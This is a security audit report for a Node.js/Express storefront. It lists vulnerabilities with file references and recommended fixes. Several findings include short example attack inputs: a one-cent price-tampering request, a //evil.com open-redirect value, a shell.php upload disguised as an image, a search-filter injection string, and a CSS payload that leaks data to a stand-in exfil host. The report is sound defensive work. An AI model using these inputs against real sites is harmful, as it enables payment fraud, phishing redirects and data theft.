# BathroomVanitiesOutlet.com — Security & Code Quality Audit

> Security and code-quality audit of the storefront, with findings and fixes.

**Date:** 2026-08-04
**Scope:** All source files — server, config, middleware, models, routes, controllers, services, jobs, key views, package.json
**Stack:** Node.js / Express 4.x / EJS / MySQL 2 / Clover Hosted Checkout

---

## CRITICAL — Exploitable Now

---

### CRIT-1 · Client-supplied cart prices are never verified against the database

**File:** `src/controllers/cartController.js:43-79`

`POST /cart/add` reads `price`, `original_price`, `compare_price`, and `bundle_discount_pct` directly from `req.body` and stores them in the session with no cross-check against the `products` table. At checkout (`checkoutController.js:93-97`), those session values are forwarded verbatim to Clover as the payment amount.

Any visitor can POST `price=0.01` to `/cart/add` and pay one cent for a $2,000 vanity.

**Fix:** In `cartController.add`, look up the real price from the DB after receiving `product_id`:

```javascript
const [rows] = await bvoPool.query(
  'SELECT price, compare_price FROM products WHERE id = ? AND is_active = 1', [product_id]
);
if (!rows.length) return res.status(400).json({ ok: false, error: 'Product not found' });
const pricef = parseFloat(rows[0].price);
```

Never accept `price`, `compare_price`, or any monetary field from the client.

---

### CRIT-2 · No order is ever recorded after a successful Clover payment

**File:** `src/controllers/checkoutController.js:149-164`

The `GET /checkout/success` handler clears the session cart and renders a success page — but never inserts a row into `orders` or `order_items`. There is also no Clover webhook endpoint. Every paid transaction disappears the moment the success page renders. The admin orders table will always be empty.

**Fix:** Before clearing the cart, INSERT an order and line items inside a transaction. Also implement a Clover webhook endpoint that verifies the HMAC signature and upserts order records, so orders are captured even if the browser redirect is dropped.

---

### CRIT-3 · Hardcoded fallback admin credentials

**File:** `src/controllers/adminController.js:134-135`

```javascript
const validUser = process.env.ADMIN_USER     || 'admin';
const validPass = process.env.ADMIN_PASSWORD || 'changeme';
```

If either env var is absent, the admin panel accepts `admin`/`changeme`. Comparison uses plain `!==`, not a constant-time function.

**Fix:** Crash at startup if either variable is missing. Store a bcrypt hash in `ADMIN_PASSWORD_HASH`. Use `crypto.timingSafeEqual` for username and `bcrypt.compare` for password.

---

### CRIT-4 · Open redirect via `return_to` bypasses `startsWith('/')` check

**File:** `src/controllers/accountController.js:49`

```javascript
res.redirect(return_to && return_to.startsWith('/') ? return_to : '/account');
```

`//evil.com/path` passes the check but browsers treat it as a protocol-relative URL (redirect to `https://evil.com`). `return_to` is read from `req.body`.

**Fix:**
```javascript
const safe = /^\/(?!\/)/.test(return_to);
res.redirect(safe ? return_to : '/account');
```

---

### CRIT-5 · Stored XSS via unescaped theme-settings output in the mega-menu

**File:** `views/partials/header.ejs:106, 108`

```ejs
<p class="mega-promo-title"><%- _vmp.title || '...' %></p>
<span class="mega-promo-cta"><%- _vmp.cta || '...' %> &rarr;</span>
```

`<%-` is raw/unescaped output. An admin can set `title` to a `<script>` tag and inject persistent JavaScript into every page served to every visitor.

**Fix:** Replace both `<%-` with `<%=` (HTML-encodes output). If limited HTML is required, sanitise with `sanitize-html` before storing in theme settings, then use `<%-`.

---

### CRIT-6 · Session secret falls back to a hardcoded string

**File:** `src/server.js:77`

```javascript
secret: process.env.SESSION_SECRET || 'bvo-dev-secret',
```

Anyone who has read the source can forge session cookies if `SESSION_SECRET` is not set, granting full admin access.

**Fix:** Crash at startup if the secret is absent or fewer than 32 characters.

---

## HIGH — Serious Risk

---

### HIGH-1 · No CSRF protection on any form

**File:** `src/server.js` (no `csurf` or equivalent); all form views

`sameSite: 'lax'` does not protect against same-site attacks (i.e., XSS on any page can make admin POSTs). Affects login, register, checkout, all cart mutations, all admin state-changing endpoints.

**Fix:** Add the `csrf-csrf` package; generate a token per session; embed it in every HTML form; validate on every state-changing POST/PUT/DELETE.

---

### HIGH-2 · No rate limiting on customer login or registration

**File:** `src/routes/account.js:9-11`

Admin login has `adminLoginLimiter` (10 req / 15 min). Customer login and register are completely unprotected — brute-force and bulk registration are unrestricted.

**Fix:**
```javascript
const loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 10, skipSuccessfulRequests: true });
const registerLimiter = rateLimit({ windowMs: 60 * 60 * 1000, max: 5 });
router.post('/login',    loginLimiter,    ctrl.login);
router.post('/register', registerLimiter, ctrl.register);
```

---

### HIGH-3 · Admin password stored as plain text; non-constant-time comparison

**File:** `src/controllers/adminController.js:137-138`

Plain `!==` comparison leaks which portion (username vs. password) is wrong via timing. Password stored as plain string in environment.

**Fix:** See CRIT-3. Use `crypto.timingSafeEqual` + `bcrypt.compare`.

---

### HIGH-4 · File upload validates MIME type only (client-controlled); extension preserved verbatim

**File:** `src/controllers/adminController.js:22-83`

Multer's `fileFilter` checks `file.mimetype`, which is the `Content-Type` the browser claims — not the actual file magic bytes. `shell.php` uploaded with `Content-Type: image/jpeg` is saved as `shell-<timestamp>.php`. Upload directory is served as static content at `/images/uploads/`. If PHP is enabled for that directory, this is remote code execution.

**Fix:**
1. Validate extension against a strict whitelist in `fileFilter`
2. Use `file-type` (reads magic bytes) for secondary validation
3. Confirm upload directory has `php_flag engine off` in `.htaccess`

---

### HIGH-5 · Clover `data.href` redirect has no domain validation

**File:** `src/controllers/checkoutController.js:134-135`

```javascript
if (data.href) return res.redirect(data.href);
```

`data.href` from the Clover API response is redirected to verbatim. A MITM or compromised upstream could send customers to a fraudulent payment page.

**Fix:** Validate that `data.href` starts with the expected Clover checkout domain before redirecting.

---

### HIGH-6 · `catSlug` injected raw into Typesense `filter_by` expression

**File:** `src/routes/search.js:50`

```javascript
const filterBy = catSlug ? `category_slug:${catSlug} && in_stock:true` : 'in_stock:true';
```

`catSlug` is `req.query.category` — a raw user-supplied string. A value like `bathroom-vanities || category_slug:hidden-category` could expose private products.

**Fix:**
```javascript
const safeSlug = (catSlug || '').replace(/[`\|&]/g, '');
const filterBy = safeSlug ? `category_slug:\`${safeSlug}\` && in_stock:true` : 'in_stock:true';
```

---

## MEDIUM — Meaningful Bugs or Hardening Gaps

---

### MED-1 · CSP `scriptSrc` includes `'unsafe-inline'`

**File:** `src/server.js:38`

`'unsafe-inline'` makes the entire Content Security Policy ineffective against XSS.

**Fix:** Move inline `<script>` blocks to external files under `/public/js/`. Remove `'unsafe-inline'`. Use `nonce-<random>` for the handful of small inline snippets (GA4, GTM, `window.__bvoIsLoggedIn`) that cannot be externalized.

---

### MED-2 · Registration reveals whether an email is already registered

**File:** `src/controllers/accountController.js:100-106`

Returns "An account with that email already exists." — enables email enumeration of all customer accounts.

**Fix:** Use a generic message (`'Please check your email for next steps.'`) regardless of whether the email exists.

---

### MED-3 · CSS property injection via admin-controlled theme color values

**File:** `views/layouts/main.ejs:89-121`

`<%= %>` encodes HTML metacharacters but not CSS metacharacters (`;`, `{`, `}`). An admin can set a color to `red; } body::before { content: url(https://exfil/?c=` and inject arbitrary CSS.

**Fix:** Validate each color value against a strict regex before saving:
```javascript
function validateColor(v) {
  return /^(#[0-9a-fA-F]{3,8}|rgb\(|rgba\(|hsl\(|hsla\()/.test(v.trim());
}
```

---

### MED-4 · `syncSettings.js` resolves the data file path one level too shallow

**File:** `src/services/syncSettings.js:11`

```javascript
const FILE = path.join(__dirname, '../data/sync_settings.json');
```

`__dirname` is `src/services`. `../data` resolves to `src/data/` instead of the root-level `data/` used by `themeSettings.js`. The file is likely being written to a non-existent path and failing silently.

**Fix:** Change to `../../data/sync_settings.json`.

---

### MED-5 · `require()` inside exported function body

**File:** `src/controllers/accountController.js:176`

```javascript
exports.newsletter = async (req, res) => {
  const { bvoPool } = require('../config/database');
```

**Fix:** Move to the top of the file.

---

### MED-6 · No length validation on customer-supplied string fields

**File:** `src/controllers/accountController.js:108-110`; `checkoutController.js:102-105`

`first_name`, `last_name`, `phone` have no length check before DB insert or Clover API call. Oversized inputs cause silent DB truncation or API errors.

**Fix:** Validate and cap length (e.g. 100 chars) before any use. Strip non-printable characters.

---

### MED-7 · `megaMenuData` middleware silently discards all DB errors

**File:** `src/middleware/megaMenuData.js:71`

DB failures degrade the mega menu with no log entry.

**Fix:** Add `console.error('[megaMenuData] DB error:', err.message)` in the catch block.

---

### MED-8 · RFLPOS sync token sent as a URL query parameter

**File:** `src/services/rflposSync.js:23-24`

The bearer token appears in server access logs, `Referer` headers, and CDN edge nodes. Also exposed verbatim in the `GET /admin/sync/probe` JSON response.

**Fix:** Move the token to an `Authorization: Bearer` header on the Node→PHP proxy call. Redact from the probe endpoint response.

---

### MED-9 · `Customer.findByEmail` returns `password_hash` to all callers via `SELECT *`

**File:** `src/models/Customer.js:10`

Any code path that logs or serializes a customer object inadvertently leaks the hash.

**Fix:** Use an explicit column list. Create a separate `findByEmailForAuth()` that selects `password_hash` and is called only in the login flow.

---

### MED-10 · Cart quantity has no upper bound; `NaN` can flow into `item.qty`

**File:** `src/controllers/cartController.js:97`

`parseInt('abc', 10)` returns `NaN`; `NaN <= 0` is `false`, so it passes the guard. Extremely large quantities produce nonsensical Clover payloads.

**Fix:**
```javascript
const qty = parseInt(rawQty, 10);
if (!Number.isFinite(qty) || qty < 1 || qty > 999) {
  return res.status(400).json({ ok: false, error: 'Invalid quantity' });
}
```

---

## LOW / BEST PRACTICE

---

### LOW-1 · `res.redirect('back')` relies on client-controlled `Referer` header

**File:** `src/controllers/adminController.js:553, 558`

**Fix:** `res.redirect('/admin/products')`.

---

### LOW-2 · `xlsx ^0.18.5` has formula-injection exposure

**File:** `package.json`

**Fix:** Add `{ cellFormula: false }` to all `XLSX.read()` calls. Evaluate migrating to `exceljs`.

---

### LOW-3 · 7-day admin session lifetime; logout doesn't destroy the session

**File:** `src/server.js:68, 85`

Current logout only deletes `isAdmin` from the session object — the session cookie stays alive for 7 days.

**Fix:** Call `req.session.destroy()` on logout. Reduce admin session to 8 hours. Implement a `lastActivity` timestamp to force re-auth after 30 minutes of inactivity.

---

### LOW-4 · `DB_PASS` silently falls back to empty string

**File:** `src/config/database.js:11`

**Fix:** Crash at startup if `DB_PASS` is not set.

---

### LOW-5 · Password minimum is only 8 characters, no complexity requirement

**File:** `src/controllers/accountController.js:90`

**Fix:** Enforce a minimum of 12 characters. Require at least one digit and one non-alpha character.

---

### LOW-6 · `sameSite: 'lax'` — no OAuth flows justify avoiding `'strict'`

**File:** `src/server.js:84`

**Fix:** Change to `sameSite: 'strict'`.

---

### LOW-7 · `csv-parse` dependency is unused; custom parser is unaudited

**File:** `package.json`

**Fix:** Either use `csv-parse` to replace the hand-rolled parser in `adminController.js`, or remove the dependency.

---

### LOW-8 · Raw `err.message` returned to admin browser in JSON responses

**File:** `src/controllers/adminController.js:1704-1706`

**Fix:** Log full error server-side; return generic message to client.

---

### LOW-9 · `CHIP_SQL` parameter binding is positional and fragile

**File:** `src/controllers/bundleController.js:31-38`

The subquery depends on being the second `?` param in every query that embeds it. Refactoring any outer query silently shifts the binding.

**Fix:** Add an explicit comment documenting the required parameter position, or move to a JOIN or SQL view.

---

## DB / DATA INTEGRITY

---

### DB-1 · INNER JOIN on NULL `attr_def_id` → zero attributes indexed in Typesense

**Files:** `src/jobs/searchSync.js:183-190` + `importJamesMartinFeed.js`

The JM importer inserts attribute values without `attr_def_id`. `searchSync.js` uses an INNER JOIN on `attr_def_id`, which produces zero rows for every JM product. The Typesense index has no finish, style, or cabinet data — attribute filtering is broken for the entire catalogue.

**Fix (quick):** Change `JOIN attribute_definitions ad ON ad.id = pav.attr_def_id` to `LEFT JOIN` and filter by `pav.attr_key` instead of `ad.attr_key`.

**Fix (proper):** In `replaceAttr`, upsert the `attribute_definitions` row first and include the resulting `id` in the attribute value insert.

---

### DB-2 · `_saveSpecs` performs DELETE + INSERT without a transaction

**File:** `src/controllers/adminController.js:1343-1352`

A crash between DELETE and the last INSERT permanently removes all product attributes with no rollback.

**Fix:** Wrap in `conn.beginTransaction()` / `conn.commit()` / `conn.rollback()`.

---

### DB-3 · All JM importer `replace*` helpers are non-transactional

**File:** `src/jobs/importJamesMartinFeed.js` (all `replaceAttr`, `replaceBullets`, `replaceImages`, etc.)

If the import is killed mid-batch, products end up with missing images, bullets, or accessory data indefinitely.

**Fix:** Wrap each product's full update cycle in a transaction using the existing `conn` object.

---

### DB-4 · Slug-uniqueness loop has no iteration cap

**File:** `src/controllers/adminController.js` (~lines 1050-1060)

With many similarly-named products, this can run dozens of DB queries per product and saturate the connection pool.

**Fix:** Cap at 50 retries; after that, append a 6-character random hex suffix.

---

### DB-5 · Bulk-delete may silently fail on FK constraints; no feedback to admin

**File:** `src/controllers/adminController.js` (bulk action `delete`)

FK `RESTRICT` constraints silently fail the DELETE. If no constraints exist, child rows are orphaned.

**Fix:** Verify `ON DELETE CASCADE` on all child tables, or delete child rows explicitly in a transaction before deleting the product. Remove any `.catch(() => {})` on destructive operations.

---

### DB-6 · `safeQuery` swallows all errors without logging

**File:** `src/controllers/adminController.js:107-109`

```javascript
.catch(() => [[]])
```

Production DB outages become invisible.

**Fix:** Log `err.message` and the SQL in the catch block before returning empty results.

---

### DB-7 · RFLPOS HTML descriptions stored without sanitisation

**File:** `src/services/rflposSync.js:179`

If RFLPOS data contains malicious HTML and any view renders it with `<%-`, it becomes stored XSS.

**Fix:** Sanitise on ingestion using `sanitize-html` with a minimal allowlist (`<p>`, `<ul>`, `<li>`, `<strong>`, `<em>`, `<br>`).

---

### DB-8 · Checkout success page is not idempotent; cart cleared on every GET

**File:** `src/controllers/checkoutController.js:149-154`

A bookmarked success URL, browser tab restore, or back-navigation repeatedly clears the cart. Without a persisted order, re-visits cannot be detected.

**Fix:** After implementing CRIT-2 (order in DB), use the Clover `checkoutSessionId` as an idempotency key: if an order with that session ID already exists, skip the insert and just render the success page.

---

## Summary Matrix

| ID | Severity | File | Short Description |
|----|----------|------|-------------------|
| CRIT-1 | CRITICAL | cartController.js:43-79 | User-supplied price; never verified against DB |
| CRIT-2 | CRITICAL | checkoutController.js:149-164 | No order written after payment — orders lost forever |
| CRIT-3 | CRITICAL | adminController.js:134-135 | Hardcoded `admin`/`changeme` fallback credentials |
| CRIT-4 | CRITICAL | accountController.js:49 | Open redirect via `//evil.com` bypass |
| CRIT-5 | CRITICAL | header.ejs:106,108 | Stored XSS via `<%-` on admin-editable promo fields |
| CRIT-6 | CRITICAL | server.js:77 | Session secret falls back to `'bvo-dev-secret'` |
| HIGH-1 | HIGH | server.js (absent) | No CSRF tokens on any form |
| HIGH-2 | HIGH | routes/account.js:9-11 | No rate limiting on customer login or registration |
| HIGH-3 | HIGH | adminController.js:137-138 | Plain-text admin password comparison |
| HIGH-4 | HIGH | adminController.js:22-83 | MIME-only file upload validation; extension preserved verbatim |
| HIGH-5 | HIGH | checkoutController.js:134-135 | Clover `data.href` redirect has no domain validation |
| HIGH-6 | HIGH | routes/search.js:50 | `catSlug` injected raw into Typesense `filter_by` |
| MED-1 | MEDIUM | server.js:38 | CSP `'unsafe-inline'` negates XSS protection |
| MED-2 | MEDIUM | accountController.js:100-106 | Registration reveals whether email is already registered |
| MED-3 | MEDIUM | main.ejs:89-121 | CSS injection via admin-controlled theme color values |
| MED-4 | MEDIUM | syncSettings.js:11 | Wrong relative path for `sync_settings.json` |
| MED-5 | MEDIUM | accountController.js:176 | `require()` inside exported function body |
| MED-6 | MEDIUM | accountController.js:108-110 | No length validation on name/phone fields |
| MED-7 | MEDIUM | megaMenuData.js:71 | DB errors in mega-menu middleware silently discarded |
| MED-8 | MEDIUM | rflposSync.js:23-24 | Sync token sent as URL query param (appears in logs) |
| MED-9 | MEDIUM | Customer.js:10 | `SELECT *` leaks `password_hash` to all callers |
| MED-10 | MEDIUM | cartController.js:97 | Quantity has no upper bound; `NaN` flows into `item.qty` |
| LOW-1 | LOW | adminController.js:553,558 | `res.redirect('back')` uses client-controlled `Referer` |
| LOW-2 | LOW | package.json | `xlsx ^0.18.5` has formula-injection exposure |
| LOW-3 | LOW | server.js:68,85 | 7-day admin session; logout doesn't destroy session |
| LOW-4 | LOW | database.js:11 | `DB_PASS` silently falls back to empty string |
| LOW-5 | LOW | accountController.js:90 | Password minimum only 8 chars, no complexity |
| LOW-6 | LOW | server.js:84 | `sameSite: 'lax'` — `'strict'` is appropriate here |
| LOW-7 | LOW | package.json | `csv-parse` listed but unused; custom parser is unaudited |
| LOW-8 | LOW | adminController.js:1704-1706 | Raw `err.message` returned to admin browser |
| LOW-9 | LOW | bundleController.js:31-38 | CHIP_SQL param binding is positional and fragile |
| DB-1 | DB INTEGRITY | searchSync.js:183-190 | INNER JOIN on NULL `attr_def_id` → zero attributes in Typesense |
| DB-2 | DB INTEGRITY | adminController.js:1343-1352 | `_saveSpecs` DELETE+INSERT without transaction |
| DB-3 | DB INTEGRITY | importJamesMartinFeed.js | All JM `replace*` helpers are non-transactional |
| DB-4 | DB INTEGRITY | adminController.js ~1050-1060 | Slug-uniqueness loop has no iteration cap |
| DB-5 | DB INTEGRITY | adminController.js (bulk delete) | Bulk-delete silently fails on FK constraints |
| DB-6 | DB INTEGRITY | adminController.js:107-109 | `safeQuery` swallows all errors without logging |
| DB-7 | DB INTEGRITY | rflposSync.js:179 | RFLPOS descriptions stored without HTML sanitisation |
| DB-8 | DB INTEGRITY | checkoutController.js:149-154 | Success page not idempotent; cart cleared on every GET |

---

## Recommended Priority Order

1. **CRIT-2** — orders are being lost on every transaction; deploy today
2. **CRIT-1** — anyone can buy anything for $0.01; deploy with CRIT-2
3. **CRIT-3 + CRIT-6** — set `ADMIN_PASSWORD` and `SESSION_SECRET` env vars immediately; verify in `.env`
4. **CRIT-4 + CRIT-5** — one-line code fixes each; commit today
5. **HIGH-1** (CSRF) — add `csrf-csrf` middleware; one afternoon of work
6. **HIGH-2** — two `rateLimit()` calls to `account.js`; thirty minutes of work
7. **DB-1** — explains why Typesense attribute filtering returns zero results for all products
8. **HIGH-4** (file upload) — add extension whitelist + `php_flag engine off` to uploads `.htaccess`
9. **MED-4** — wrong path for `sync_settings.json`; one-line fix
10. Everything else can be addressed in sprint planning
